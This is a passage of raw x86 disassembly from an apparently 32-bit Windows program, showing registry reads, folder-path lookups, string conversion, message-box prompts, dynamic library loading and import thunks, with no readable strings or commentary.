  401bbd:	mov    DWORD PTR [esp],eax
  401bc0:	call   DWORD PTR ds:0x4112ac
  401bc6:	sub    esp,0x8
  401bc9:	test   eax,eax
  401bcb:	je     0x401bd9
  401bcd:	mov    DWORD PTR [esp],0x800
  401bd4:	call   eax
  401bd6:	sub    esp,0x4
  401bd9:	mov    DWORD PTR [esp],0x40d244
  401be0:	call   edi
  401be2:	sub    esp,0x4
  401be5:	test   eax,eax
  401be7:	je     0x401c30
  401be9:	mov    DWORD PTR [esp+0x4],0x40d29d
  401bf1:	mov    DWORD PTR [esp],eax
  401bf4:	call   DWORD PTR ds:0x4112ac
  401bfa:	sub    esp,0x8
  401bfd:	test   eax,eax
  401bff:	je     0x401c30
  401c01:	lea    edx,[ebp-0x220]
  401c07:	mov    DWORD PTR [ebp-0x220],0x0
  401c11:	mov    DWORD PTR [esp+0x8],0x4
  401c19:	mov    BYTE PTR [ebp-0x220],0x4
  401c20:	mov    DWORD PTR [esp],0xa
  401c27:	mov    DWORD PTR [esp+0x4],edx
  401c2b:	call   eax
  401c2d:	sub    esp,0xc
  401c30:	call   DWORD PTR ds:0x41128c
  401c36:	lea    ecx,[ebp-0x43c]
  401c3c:	mov    DWORD PTR [esp],eax
  401c3f:	mov    DWORD PTR [esp+0x4],ecx
  401c43:	call   DWORD PTR ds:0x4113ec
  401c49:	mov    ebx,eax
  401c4b:	sub    esp,0x8
  401c4e:	mov    DWORD PTR [ebp-0x44c],eax
  401c54:	test   ebx,ebx
  401c56:	mov    eax,0x1
  401c5b:	je     0x402018
  401c61:	mov    eax,DWORD PTR [ebp-0x43c]
  401c67:	lea    eax,[eax*4+0x1e]
  401c6e:	and    eax,0xfffffff0
  401c71:	call   0x4039a0
  401c76:	mov    edi,DWORD PTR ds:0x411310
  401c7c:	sub    esp,eax
  401c7e:	lea    ebx,[esp+0x27]
  401c82:	mov    DWORD PTR [esp+0x1c],0x0
  401c8a:	mov    DWORD PTR [esp+0x18],0x0
  401c92:	mov    DWORD PTR [ebp-0x454],edi
  401c98:	mov    DWORD PTR [esp+0x14],0x0
  401ca0:	shr    ebx,0x2
  401ca3:	mov    DWORD PTR [esp+0x10],0x0
  401cab:	mov    DWORD PTR [esp+0xc],0xffffffff
  401cb3:	lea    esi,[ebx*4+0x0]
  401cba:	mov    DWORD PTR [esp+0x8],0x40d2b8
  401cc2:	mov    DWORD PTR [esp+0x4],0x0
  401cca:	mov    DWORD PTR [esp],0xfde9
  401cd1:	mov    DWORD PTR [ebp-0x458],esi
  401cd7:	call   edi
  401cd9:	sub    esp,0x20
  401cdc:	mov    edi,eax
  401cde:	mov    DWORD PTR [esp],eax
  401ce1:	call   0x40acf0
  401ce6:	test   eax,eax
  401ce8:	mov    esi,eax
  401cea:	je     0x401d2c
  401cec:	mov    DWORD PTR [esp+0x1c],0x0
  401cf4:	mov    DWORD PTR [esp+0x18],0x0
  401cfc:	mov    DWORD PTR [esp+0x14],edi
  401d00:	mov    DWORD PTR [esp+0x10],eax
  401d04:	mov    DWORD PTR [esp+0xc],0xffffffff
  401d0c:	mov    DWORD PTR [esp+0x8],0x40d2b8
  401d14:	mov    DWORD PTR [esp+0x4],0x0
  401d1c:	mov    DWORD PTR [esp],0xfde9
  401d23:	call   DWORD PTR [ebp-0x454]
  401d29:	sub    esp,0x20
  401d2c:	mov    DWORD PTR [ebx*4+0x0],esi
  401d33:	mov    DWORD PTR [esp+0x1c],0x0
  401d3b:	mov    DWORD PTR [esp+0x18],0x0
  401d43:	mov    DWORD PTR [esp+0x14],0x0
  401d4b:	mov    DWORD PTR [esp+0x10],0x0
  401d53:	mov    DWORD PTR [esp+0xc],0xffffffff
  401d5b:	mov    DWORD PTR [esp+0x8],0x40d2d8
  401d63:	mov    DWORD PTR [esp+0x4],0x0
  401d6b:	mov    DWORD PTR [esp],0xfde9
  401d72:	call   DWORD PTR [ebp-0x454]
  401d78:	sub    esp,0x20
  401d7b:	mov    edi,eax
  401d7d:	mov    DWORD PTR [esp],eax
  401d80:	call   0x40acf0
  401d85:	test   eax,eax
  401d87:	mov    esi,eax
  401d89:	je     0x401dcb
  401d8b:	mov    DWORD PTR [esp+0x1c],0x0
  401d93:	mov    DWORD PTR [esp+0x18],0x0
  401d9b:	mov    DWORD PTR [esp+0x14],edi
  401d9f:	mov    DWORD PTR [esp+0x10],eax
  401da3:	mov    DWORD PTR [esp+0xc],0xffffffff
  401dab:	mov    DWORD PTR [esp+0x8],0x40d2d8
  401db3:	mov    DWORD PTR [esp+0x4],0x0
  401dbb:	mov    DWORD PTR [esp],0xfde9
  401dc2:	call   DWORD PTR [ebp-0x454]
  401dc8:	sub    esp,0x20
  401dcb:	cmp    DWORD PTR [ebp-0x43c],0x1
  401dd2:	mov    DWORD PTR [ebx*4+0x4],esi
  401dd9:	jle    0x4020fd
  401ddf:	mov    ebx,0x1
  401de4:	mov    DWORD PTR [ebp-0x45c],0x0
  401dee:	mov    DWORD PTR [ebp-0x460],0x2
  401df8:	mov    DWORD PTR [ebp-0x450],0x1
  401e02:	jmp    0x401e1f
  401e04:	mov    eax,DWORD PTR [ebp-0x43c]
  401e0a:	mov    DWORD PTR [ebp-0x450],0x0
  401e14:	add    ebx,0x1
  401e17:	cmp    ebx,eax
  401e19:	jge    0x401eb1
  401e1f:	mov    ecx,DWORD PTR [ebp-0x44c]
  401e25:	lea    edi,[ebx*4+0x0]
  401e2c:	mov    DWORD PTR [esp+0x4],0x40d2fe
  401e34:	lea    esi,[ecx+edi*1]
  401e37:	mov    eax,DWORD PTR [esi]
  401e39:	mov    DWORD PTR [esp],eax
  401e3c:	call   0x40aca0
  401e41:	test   eax,eax
  401e43:	je     0x401e04
  401e45:	mov    DWORD PTR [esp+0x8],0xa
  401e4d:	mov    DWORD PTR [esp+0x4],0x40d31c
  401e55:	mov    edx,DWORD PTR [esi]
  401e57:	mov    DWORD PTR [esp],edx
  401e5a:	call   0x40ac88
  401e5f:	test   eax,eax
  401e61:	jne    0x402022
  401e67:	mov    eax,DWORD PTR [ebp-0x43c]
  401e6d:	lea    esi,[eax-0x1]
  401e70:	cmp    esi,ebx
  401e72:	jle    0x401e14
  401e74:	mov    ecx,DWORD PTR [ebp-0x44c]
  401e7a:	mov    DWORD PTR [esp+0x8],0x2
  401e82:	mov    DWORD PTR [esp+0x4],0x40d332
  401e8a:	lea    edi,[ecx+edi*1+0x4]
  401e8e:	mov    edx,DWORD PTR [edi]
  401e90:	mov    DWORD PTR [esp],edx
  401e93:	call   0x40ac88
  401e98:	test   eax,eax
  401e9a:	jne    0x4022b1
  401ea0:	mov    eax,DWORD PTR [ebp-0x43c]
  401ea6:	add    ebx,0x1
  401ea9:	cmp    ebx,eax
  401eab:	jl     0x401e1f
  401eb1:	mov    ebx,DWORD PTR [ebp-0x460]
  401eb7:	mov    eax,DWORD PTR [ebp-0x458]
  401ebd:	mov    ecx,DWORD PTR [ebp-0x44c]
  401ec3:	mov    DWORD PTR [eax+ebx*4],0x0
  401eca:	mov    DWORD PTR [ebp-0x43c],ebx
  401ed0:	mov    DWORD PTR [esp],ecx
  401ed3:	call   DWORD PTR ds:0x4112e0
  401ed9:	mov    edx,DWORD PTR [ebp-0x450]
  401edf:	sub    esp,0x4
  401ee2:	test   edx,edx
  401ee4:	jne    0x40212e
  401eea:	mov    DWORD PTR [esp+0x4],0x8000
  401ef2:	mov    DWORD PTR [esp],0x0
  401ef9:	call   DWORD PTR ds:0x411358
  401eff:	mov    ebx,DWORD PTR [ebp-0x45c]
  401f05:	test   ebx,ebx
  401f07:	je     0x402380
  401f0d:	mov    esi,DWORD PTR [ebp-0x45c]
  401f13:	mov    ecx,0x4
  401f18:	mov    edi,0x40d91c
  401f1d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1f:	jne    0x402200
  401f25:	mov    edx,DWORD PTR [ebp-0x45c]
  401f2b:	mov    DWORD PTR [esp],edx
  401f2e:	call   0x40ad10
  401f33:	mov    ecx,DWORD PTR [ebp-0x458]
  401f39:	mov    edi,DWORD PTR [ebp-0x43c]
  401f3f:	mov    DWORD PTR [esp+0x4],ecx
  401f43:	mov    DWORD PTR [esp],edi
  401f46:	call   0x402838
  401f4b:	test   eax,eax
  401f4d:	mov    esi,eax
  401f4f:	je     0x402353
  401f55:	mov    DWORD PTR [esp],eax
  401f58:	mov    DWORD PTR [esp+0xc],0x40d921
  401f60:	mov    DWORD PTR [esp+0x8],0x40d925
  401f68:	mov    DWORD PTR [esp+0x4],0x40d92b
  401f70:	call   0x402820
  401f75:	mov    DWORD PTR [esp+0x8],0x40d93c
  401f7d:	mov    DWORD PTR [esp+0x4],0x40d946
  401f85:	mov    DWORD PTR [esp],esi
  401f88:	call   0x402818
  401f8d:	mov    DWORD PTR [esp+0x4],0x40d957
  401f95:	mov    DWORD PTR [esp],esi
  401f98:	call   0x402840
  401f9d:	mov    DWORD PTR [esp+0x4],0x40d964
  401fa5:	mov    DWORD PTR [esp],esi
  401fa8:	call   0x402840
  401fad:	mov    DWORD PTR [esp+0x4],0x0
  401fb5:	mov    DWORD PTR [esp],esi
  401fb8:	call   0x402840
  401fbd:	mov    DWORD PTR [esp+0xc],0x0
  401fc5:	mov    DWORD PTR [esp+0x8],0x0
  401fcd:	mov    DWORD PTR [esp+0x4],0xffffffff
  401fd5:	mov    DWORD PTR [esp],esi
  401fd8:	call   0x402830
  401fdd:	mov    DWORD PTR [esp],esi
  401fe0:	call   0x402810
  401fe5:	mov    DWORD PTR [esp],esi
  401fe8:	call   0x402828
  401fed:	mov    eax,DWORD PTR [ebp-0x43c]
  401ff3:	xor    ebx,ebx
  401ff5:	mov    edi,DWORD PTR [ebp-0x458]
  401ffb:	test   eax,eax
  401ffd:	jle    0x402016
  401fff:	nop
  402000:	mov    edx,DWORD PTR [edi+ebx*4]
  402003:	add    ebx,0x1
  402006:	mov    DWORD PTR [esp],edx
  402009:	call   0x40ad10
  40200e:	cmp    DWORD PTR [ebp-0x43c],ebx
  402014:	jg     0x402000
  402016:	xor    eax,eax
  402018:	lea    esp,[ebp-0xc]
  40201b:	pop    ebx
  40201c:	pop    esi
  40201d:	pop    edi
  40201e:	pop    ebp
  40201f:	ret    0x10
  402022:	mov    edi,DWORD PTR [ebp-0x460]
  402028:	mov    ecx,DWORD PTR [esi]
  40202a:	mov    DWORD PTR [esp+0x1c],0x0
  402032:	mov    DWORD PTR [esp+0x18],0x0
  40203a:	mov    DWORD PTR [esp+0x14],0x0
  402042:	mov    DWORD PTR [esp+0x10],0x0
  40204a:	add    edi,0x1
  40204d:	mov    DWORD PTR [esp+0x8],ecx
  402051:	mov    DWORD PTR [ebp-0x46c],ecx
  402057:	mov    DWORD PTR [ebp-0x464],edi
  40205d:	mov    DWORD PTR [esp+0xc],0xffffffff
  402065:	mov    DWORD PTR [esp+0x4],0x0
  40206d:	mov    DWORD PTR [esp],0xfde9
  402074:	mov    esi,DWORD PTR [ebp-0x454]
  40207a:	call   esi
  40207c:	sub    esp,0x20
  40207f:	mov    DWORD PTR [ebp-0x468],eax
  402085:	mov    DWORD PTR [esp],eax
  402088:	call   0x40acf0
  40208d:	test   eax,eax
  40208f:	mov    edi,eax
  402091:	je     0x4020d7
  402093:	mov    ecx,DWORD PTR [ebp-0x468]
  402099:	mov    DWORD PTR [esp+0x10],eax
  40209d:	mov    eax,DWORD PTR [ebp-0x46c]
  4020a3:	mov    DWORD PTR [esp+0x1c],0x0
  4020ab:	mov    DWORD PTR [esp+0x18],0x0
  4020b3:	mov    DWORD PTR [esp+0xc],0xffffffff
  4020bb:	mov    DWORD PTR [esp+0x14],ecx
  4020bf:	mov    DWORD PTR [esp+0x4],0x0
  4020c7:	mov    DWORD PTR [esp+0x8],eax
  4020cb:	mov    DWORD PTR [esp],0xfde9
  4020d2:	call   esi
  4020d4:	sub    esp,0x20
  4020d7:	mov    edx,DWORD PTR [ebp-0x460]
  4020dd:	mov    ecx,DWORD PTR [ebp-0x458]
  4020e3:	mov    eax,DWORD PTR [ebp-0x43c]
  4020e9:	mov    DWORD PTR [ecx+edx*4],edi
  4020ec:	mov    edi,DWORD PTR [ebp-0x464]
  4020f2:	mov    DWORD PTR [ebp-0x460],edi
  4020f8:	jmp    0x401e14
  4020fd:	mov    edx,DWORD PTR [ebp-0x44c]
  402103:	mov    DWORD PTR [ebx*4+0x8],0x0
  40210e:	mov    DWORD PTR [ebp-0x43c],0x2
  402118:	mov    DWORD PTR [esp],edx
  40211b:	call   DWORD PTR ds:0x4112e0
  402121:	mov    DWORD PTR [ebp-0x45c],0x0
  40212b:	sub    esp,0x4
  40212e:	mov    DWORD PTR [esp+0x10],0x40f040
  402136:	mov    DWORD PTR [esp+0xc],0x0
  40213e:	mov    DWORD PTR [esp+0x8],0x0
  402146:	mov    DWORD PTR [esp+0x4],0x801a
  40214e:	mov    DWORD PTR [esp],0x0
  402155:	call   DWORD PTR ds:0x4113f0
  40215b:	sub    esp,0x14
  40215e:	test   eax,eax
  402160:	jne    0x402293
  402166:	mov    DWORD PTR [esp],0x40f040
  40216d:	lea    ebx,[ebp-0x428]
  402173:	call   0x40ac90
  402178:	lea    esi,[eax+eax*1+0x40f040]
  40217f:	mov    DWORD PTR [esp+0xc],0x40d356
  402187:	mov    DWORD PTR [esp+0x8],0x40d374
  40218f:	mov    DWORD PTR [esp+0x4],0x104
  402197:	mov    DWORD PTR [esp],esi
  40219a:	mov    esi,DWORD PTR ds:0x41135c
  4021a0:	call   esi
  4021a2:	mov    DWORD PTR [esp+0x4],0x40f040
  4021aa:	mov    DWORD PTR [esp],ebx
  4021ad:	mov    DWORD PTR ds:0x40f248,0x40f040
  4021b7:	call   0x40ac98
  4021bc:	mov    DWORD PTR [esp+0x4],0x40d37a
  4021c4:	mov    DWORD PTR [esp],ebx
  4021c7:	call   0x40aca8
  4021cc:	mov    eax,ds:0x40f248
  4021d1:	mov    DWORD PTR [esp+0x4],ebx
  4021d5:	mov    DWORD PTR [esp],eax
  4021d8:	call   DWORD PTR ds:0x4113b8
  4021de:	test   eax,eax
  4021e0:	je     0x402235
  4021e2:	mov    DWORD PTR [esp],0x401ab0
  4021e9:	call   DWORD PTR ds:0x4112f4
  4021ef:	sub    esp,0x4
  4021f2:	jmp    0x401eea
  4021f7:	mov    esi,esi
  4021f9:	lea    edi,[edi+eiz*1+0x0]
  402200:	mov    eax,DWORD PTR [ebp-0x45c]
  402206:	lea    ebx,[ebp-0x220]
  40220c:	mov    DWORD PTR [esp+0x8],0x40d024
  402214:	mov    DWORD PTR [esp+0x4],0xb
  40221c:	mov    DWORD PTR [esp],ebx
  40221f:	mov    DWORD PTR [esp+0xc],eax
  402223:	call   0x4015c0
  402228:	mov    DWORD PTR [esp],ebx
  40222b:	call   0x40ac80
  402230:	jmp    0x401f25
  402235:	mov    DWORD PTR [esp+0x4],0x40d382
  40223d:	mov    DWORD PTR [esp],ebx
  402240:	call   DWORD PTR ds:0x4113b0
  402246:	test   eax,eax
  402248:	je     0x4021e2
  40224a:	mov    DWORD PTR [esp],eax
  40224d:	call   0x40ad38
  402252:	mov    DWORD PTR [esp+0xc],0x4
  40225a:	mov    DWORD PTR [esp+0x8],0x40d39c
  402262:	mov    DWORD PTR [esp+0x4],0x40d3c4
  40226a:	mov    DWORD PTR [esp],0x0
  402271:	mov    edi,DWORD PTR ds:0x4113f8
  402277:	call   edi
  402279:	sub    esp,0x10
  40227c:	cmp    eax,0x6
  40227f:	je     0x4024a9
  402285:	mov    DWORD PTR [esp],ebx
  402288:	call   DWORD PTR ds:0x4113b4
  40228e:	jmp    0x4021e2
  402293:	mov    edi,DWORD PTR ds:0x41134c
  402299:	mov    DWORD PTR [esp+0x4],0x40d338
  4022a1:	add    edi,0x40
  4022a4:	mov    DWORD PTR [esp],edi
  4022a7:	call   0x401560
  4022ac:	jmp    0x402166
  4022b1:	mov    edi,DWORD PTR [edi]
  4022b3:	mov    DWORD PTR [esp+0x1c],0x0
  4022bb:	add    ebx,0x1
  4022be:	mov    DWORD PTR [esp+0x18],0x0
  4022c6:	mov    DWORD PTR [esp+0x14],0x0
  4022ce:	mov    DWORD PTR [esp+0x10],0x0
  4022d6:	mov    DWORD PTR [esp+0xc],0xffffffff
  4022de:	mov    DWORD PTR [esp+0x8],edi
  4022e2:	mov    DWORD PTR [esp+0x4],0x0
  4022ea:	mov    DWORD PTR [esp],0xfde9
  4022f1:	call   DWORD PTR [ebp-0x454]
  4022f7:	sub    esp,0x20
  4022fa:	mov    esi,eax
  4022fc:	mov    DWORD PTR [esp],eax
  4022ff:	call   0x40acf0
  402304:	test   eax,eax
  402306:	mov    DWORD PTR [ebp-0x45c],eax
  40230c:	je     0x401ea0
  402312:	mov    DWORD PTR [esp+0x1c],0x0
  40231a:	mov    DWORD PTR [esp+0x18],0x0
  402322:	mov    DWORD PTR [esp+0x14],esi
  402326:	mov    DWORD PTR [esp+0x10],eax
  40232a:	mov    DWORD PTR [esp+0xc],0xffffffff
  402332:	mov    DWORD PTR [esp+0x8],edi
  402336:	mov    DWORD PTR [esp+0x4],0x0
  40233e:	mov    DWORD PTR [esp],0xfde9
  402345:	call   DWORD PTR [ebp-0x454]
  40234b:	sub    esp,0x20
  40234e:	jmp    0x401ea0
  402353:	mov    DWORD PTR [esp+0xc],0x10
  40235b:	mov    DWORD PTR [esp+0x8],0x40d978
  402363:	mov    DWORD PTR [esp+0x4],0x40d99c
  40236b:	mov    DWORD PTR [esp],0x0
  402372:	call   DWORD PTR ds:0x4113f8
  402378:	sub    esp,0x10
  40237b:	jmp    0x401fed
  402380:	lea    edi,[ebp-0x438]
  402386:	mov    DWORD PTR [esp+0xc],0x20019
  40238e:	mov    DWORD PTR [esp+0x8],0x0
  402396:	mov    DWORD PTR [esp+0x4],0x40d8e4
  40239e:	mov    DWORD PTR [esp],0x80000001
  4023a5:	mov    DWORD PTR [esp+0x10],edi
  4023a9:	call   DWORD PTR ds:0x411270
  4023af:	sub    esp,0x14
  4023b2:	test   eax,eax
  4023b4:	jne    0x401f25
  4023ba:	lea    esi,[ebp-0x428]
  4023c0:	mov    ecx,DWORD PTR [ebp-0x438]
  4023c6:	mov    DWORD PTR [ebp-0x428],0x100
  4023d0:	mov    DWORD PTR [esp+0xc],0x0
  4023d8:	mov    DWORD PTR [esp+0x8],0x0
  4023e0:	mov    DWORD PTR [esp+0x14],esi
  4023e4:	lea    esi,[ebp-0x220]
  4023ea:	mov    DWORD PTR [esp+0x4],0x40d912
  4023f2:	mov    DWORD PTR [esp],ecx
  4023f5:	mov    DWORD PTR [esp+0x10],esi
  4023f9:	call   DWORD PTR ds:0x411274
  4023ff:	sub    esp,0x18
  402402:	test   eax,eax
  402404:	jne    0x401f25
  40240a:	mov    DWORD PTR [esp+0x1c],0x0
  402412:	mov    DWORD PTR [esp+0x18],0x0
  40241a:	mov    DWORD PTR [esp+0x14],0x0
  402422:	mov    DWORD PTR [esp+0x10],0x0
  40242a:	mov    DWORD PTR [esp+0xc],0xffffffff
  402432:	mov    DWORD PTR [esp+0x8],esi
  402436:	mov    DWORD PTR [esp+0x4],0x0
  40243e:	mov    DWORD PTR [esp],0xfde9
  402445:	call   DWORD PTR [ebp-0x454]
  40244b:	sub    esp,0x20
  40244e:	mov    edi,eax
  402450:	mov    DWORD PTR [esp],eax
  402453:	call   0x40acf0
  402458:	test   eax,eax
  40245a:	mov    ebx,eax
  40245c:	je     0x401f25
  402462:	mov    DWORD PTR [esp+0x1c],0x0
  40246a:	mov    DWORD PTR [esp+0x18],0x0
  402472:	mov    DWORD PTR [esp+0x14],edi
  402476:	mov    DWORD PTR [esp+0x10],eax
  40247a:	mov    DWORD PTR [esp+0xc],0xffffffff
  402482:	mov    DWORD PTR [esp+0x8],esi
  402486:	mov    DWORD PTR [esp+0x4],0x0
  40248e:	mov    DWORD PTR [esp],0xfde9
  402495:	call   DWORD PTR [ebp-0x454]
  40249b:	mov    DWORD PTR [ebp-0x45c],ebx
  4024a1:	sub    esp,0x20
  4024a4:	jmp    0x401f0d
  4024a9:	mov    DWORD PTR [esp],0x40d488
  4024b0:	call   DWORD PTR [ebp-0x470]
  4024b6:	sub    esp,0x4
  4024b9:	test   eax,eax
  4024bb:	mov    DWORD PTR [ebp-0x44c],eax
  4024c1:	je     0x4025cd
  4024c7:	mov    ecx,DWORD PTR ds:0x4112ac
  4024cd:	mov    DWORD PTR [esp+0x4],0x40d4d0
  4024d5:	mov    DWORD PTR [esp],eax
  4024d8:	mov    DWORD PTR [ebp-0x460],ecx
  4024de:	call   ecx
  4024e0:	mov    DWORD PTR [ebp-0x46c],eax
  4024e6:	mov    eax,DWORD PTR [ebp-0x44c]
  4024ec:	sub    esp,0x8
  4024ef:	mov    DWORD PTR [esp+0x4],0x40d4de
  4024f7:	mov    DWORD PTR [esp],eax
  4024fa:	call   DWORD PTR [ebp-0x460]
  402500:	mov    ecx,DWORD PTR [ebp-0x44c]
  402506:	sub    esp,0x8
  402509:	mov    DWORD PTR [ebp-0x464],eax
  40250f:	mov    DWORD PTR [esp+0x4],0x40d4ef
  402517:	mov    DWORD PTR [esp],ecx
  40251a:	call   DWORD PTR [ebp-0x460]
  402520:	mov    edx,DWORD PTR [ebp-0x44c]
  402526:	sub    esp,0x8
  402529:	mov    DWORD PTR [ebp-0x450],eax
  40252f:	mov    DWORD PTR [esp+0x4],0x40d503
  402537:	mov    DWORD PTR [esp],edx
  40253a:	call   DWORD PTR [ebp-0x460]
  402540:	mov    edx,DWORD PTR [ebp-0x46c]
  402546:	sub    esp,0x8
  402549:	mov    DWORD PTR [ebp-0x468],eax
  40254f:	test   edx,edx
  402551:	je     0x40256f
  402553:	mov    ecx,DWORD PTR [ebp-0x464]
  402559:	test   ecx,ecx
  40255b:	je     0x40256f
  40255d:	mov    ecx,DWORD PTR [ebp-0x450]
  402563:	test   ecx,ecx
  402565:	je     0x40256f
  402567:	test   eax,eax
  402569:	jne    0x4025f2
  40256f:	call   DWORD PTR ds:0x41129c
  402575:	mov    ecx,DWORD PTR ds:0x41134c
  40257b:	mov    DWORD PTR [esp+0x8],eax
  40257f:	mov    DWORD PTR [esp+0x4],0x40d510
  402587:	add    ecx,0x40
  40258a:	mov    DWORD PTR [esp],ecx
  40258d:	call   0x401560
  402592:	mov    eax,DWORD PTR [ebp-0x44c]
  402598:	mov    DWORD PTR [esp],eax
  40259b:	call   DWORD PTR ds:0x411288
  4025a1:	sub    esp,0x4
  4025a4:	mov    DWORD PTR [esp+0xc],0x0
  4025ac:	mov    DWORD PTR [esp+0x8],0x40d870
  4025b4:	mov    DWORD PTR [esp+0x4],0x40d894
  4025bc:	mov    DWORD PTR [esp],0x0
  4025c3:	call   edi
  4025c5:	sub    esp,0x10
  4025c8:	jmp    0x402285
  4025cd:	call   DWORD PTR ds:0x41129c
  4025d3:	mov    edx,DWORD PTR ds:0x41134c
  4025d9:	mov    DWORD PTR [esp+0x8],eax
  4025dd:	mov    DWORD PTR [esp+0x4],0x40d4a0
  4025e5:	add    edx,0x40
  4025e8:	mov    DWORD PTR [esp],edx
  4025eb:	call   0x401560
  4025f0:	jmp    0x4025a4
  4025f2:	mov    DWORD PTR [esp+0x10],0x0
  4025fa:	mov    DWORD PTR [esp+0xc],0x0
  402602:	mov    DWORD PTR [esp+0x8],0x0
  40260a:	mov    DWORD PTR [esp+0x4],0x0
  402612:	mov    DWORD PTR [esp],0x40d54c
  402619:	call   edx
  40261b:	sub    esp,0x14
  40261e:	test   eax,eax
  402620:	mov    DWORD PTR [ebp-0x46c],eax
  402626:	je     0x4027da
  40262c:	mov    DWORD PTR [esp+0x1c],0x0
  402634:	mov    DWORD PTR [esp+0x18],0x8000000
  40263c:	mov    DWORD PTR [esp+0x14],0x1
  402644:	mov    DWORD PTR [esp+0x10],0x0
  40264c:	mov    DWORD PTR [esp+0xc],0x0
  402654:	mov    DWORD PTR [esp+0x8],0x15
  40265c:	mov    DWORD PTR [esp+0x4],0x40d574
  402664:	mov    DWORD PTR [esp],eax
  402667:	call   DWORD PTR [ebp-0x464]
  40266d:	sub    esp,0x20
  402670:	test   eax,eax
  402672:	mov    DWORD PTR [ebp-0x460],eax
  402678:	je     0x40278e
  40267e:	lea    eax,[ebp-0x438]
  402684:	mov    DWORD PTR [esp],eax
  402687:	call   DWORD PTR ds:0x4112b4
  40268d:	movzx  edx,WORD PTR [ebp-0x42c]
  402694:	movzx  ecx,WORD PTR [ebp-0x42e]
  40269b:	sub    esp,0x4
  40269e:	movzx  eax,WORD PTR [ebp-0x430]
  4026a5:	mov    DWORD PTR [esp+0x8],0x40d59c
  4026ad:	mov    DWORD PTR [esp+0x4],0x104
  4026b5:	mov    DWORD PTR [esp+0x20],edx
  4026b9:	movzx  edx,WORD PTR [ebp-0x432]
  4026c0:	mov    DWORD PTR [esp+0x1c],ecx
  4026c4:	mov    DWORD PTR [esp+0x18],eax
  4026c8:	movzx  ecx,WORD PTR [ebp-0x436]
  4026cf:	movzx  eax,WORD PTR [ebp-0x438]
  4026d6:	mov    DWORD PTR [esp+0x14],edx
  4026da:	lea    edx,[ebp-0x220]
  4026e0:	mov    DWORD PTR [esp+0x10],ecx
  4026e4:	mov    DWORD PTR [esp+0xc],eax
  4026e8:	mov    DWORD PTR [esp],edx
  4026eb:	mov    DWORD PTR [ebp-0x464],edx
  4026f1:	call   esi
  4026f3:	mov    esi,DWORD PTR [ebp-0x464]
  4026f9:	mov    ecx,DWORD PTR [ebp-0x460]
  4026ff:	mov    DWORD PTR [esp+0x10],0x0
  402707:	mov    DWORD PTR [esp+0xc],0x2
  40270f:	mov    DWORD PTR [esp+0x4],ebx
  402713:	mov    DWORD PTR [esp+0x8],esi
  402717:	mov    DWORD PTR [esp],ecx
  40271a:	call   DWORD PTR [ebp-0x468]
  402720:	sub    esp,0x14
  402723:	test   eax,eax
  402725:	je     0x402768
  402727:	mov    eax,ds:0x41134c
  40272c:	mov    DWORD PTR [esp+0x4],0x40d5ec
  402734:	add    eax,0x40
  402737:	mov    DWORD PTR [esp],eax
  40273a:	call   0x401560
  40273f:	mov    edx,DWORD PTR [ebp-0x460]
  402745:	mov    DWORD PTR [esp],edx
  402748:	call   DWORD PTR [ebp-0x450]
  40274e:	sub    esp,0x4
  402751:	mov    esi,DWORD PTR [ebp-0x46c]
  402757:	mov    DWORD PTR [esp],esi
  40275a:	call   DWORD PTR [ebp-0x450]
  402760:	sub    esp,0x4
  402763:	jmp    0x402592
  402768:	mov    DWORD PTR [esp+0xc],0x0
  402770:	mov    DWORD PTR [esp+0x8],0x40d60c
  402778:	mov    DWORD PTR [esp+0x4],0x40d638
  402780:	mov    DWORD PTR [esp],0x0
  402787:	call   edi
  402789:	sub    esp,0x10
  40278c:	jmp    0x40273f
  40278e:	mov    DWORD PTR [esp+0xc],0x0
  402796:	mov    DWORD PTR [esp+0x8],0x40d60c
  40279e:	mov    DWORD PTR [esp+0x4],0x40d6f4
  4027a6:	mov    DWORD PTR [esp],0x0
  4027ad:	call   edi
  4027af:	sub    esp,0x10
  4027b2:	call   DWORD PTR ds:0x41129c
  4027b8:	mov    esi,DWORD PTR ds:0x41134c
  4027be:	mov    DWORD PTR [esp+0x8],eax
  4027c2:	mov    DWORD PTR [esp+0x4],0x40d798
  4027ca:	add    esi,0x40
  4027cd:	mov    DWORD PTR [esp],esi
  4027d0:	call   0x401560
  4027d5:	jmp    0x402751
  4027da:	mov    DWORD PTR [esp+0xc],0x0
  4027e2:	mov    DWORD PTR [esp+0x8],0x40d60c
  4027ea:	mov    DWORD PTR [esp+0x4],0x40d7c0
  4027f2:	mov    DWORD PTR [esp],0x0
  4027f9:	call   edi
  4027fb:	sub    esp,0x10
  4027fe:	jmp    0x402592
  402803:	nop
  402804:	nop
  402805:	nop
  402806:	nop
  402807:	nop
  402808:	nop
  402809:	nop
  40280a:	nop
  40280b:	nop
  40280c:	nop
  40280d:	nop
  40280e:	nop
  40280f:	nop
  402810:	jmp    DWORD PTR ds:0x411268
  402816:	nop
  402817:	nop
  402818:	jmp    DWORD PTR ds:0x411264
  40281e:	nop
  40281f:	nop
  402820:	jmp    DWORD PTR ds:0x411260
  402826:	nop
  402827:	nop
  402828:	jmp    DWORD PTR ds:0x41125c
  40282e:	nop
  40282f:	nop
  402830:	jmp    DWORD PTR ds:0x411258
  402836:	nop
  402837:	nop
  402838:	jmp    DWORD PTR ds:0x411254
  40283e:	nop
  40283f:	nop
  402840:	jmp    DWORD PTR ds:0x411250
  402846:	nop
  402847:	nop
  402848:	jmp    DWORD PTR ds:0x4113e4
  40284e:	nop
  40284f:	nop
  402850:	push   ebx
  402851:	sub    esp,0x28
  402854:	mov    eax,ds:0x4100a4
  402859:	mov    DWORD PTR [esp],eax
  40285c:	call   0x402ce0
  402861:	cmp    eax,0xffffffff
  402864:	mov    DWORD PTR [esp+0x18],eax
  402868:	je     0x4028f0
  40286e:	mov    DWORD PTR [esp],0x8
  402875:	call   0x40ad50
  40287a:	mov    eax,ds:0x4100a4
  40287f:	mov    DWORD PTR [esp],eax
  402882:	call   0x402ce0
  402887:	mov    DWORD PTR [esp+0x18],eax
  40288b:	mov    eax,ds:0x4100a0
  402890:	mov    DWORD PTR [esp],eax
  402893:	call   0x402ce0
  402898:	mov    DWORD PTR [esp+0x1c],eax
  40289c:	lea    eax,[esp+0x1c]
  4028a0:	mov    DWORD PTR [esp+0x8],eax
  4028a4:	lea    eax,[esp+0x18]
  4028a8:	mov    DWORD PTR [esp+0x4],eax
  4028ac:	mov    eax,DWORD PTR [esp+0x30]
  4028b0:	mov    DWORD PTR [esp],eax
  4028b3:	call   0x40ad90
  4028b8:	mov    ebx,eax
  4028ba:	mov    eax,DWORD PTR [esp+0x18]
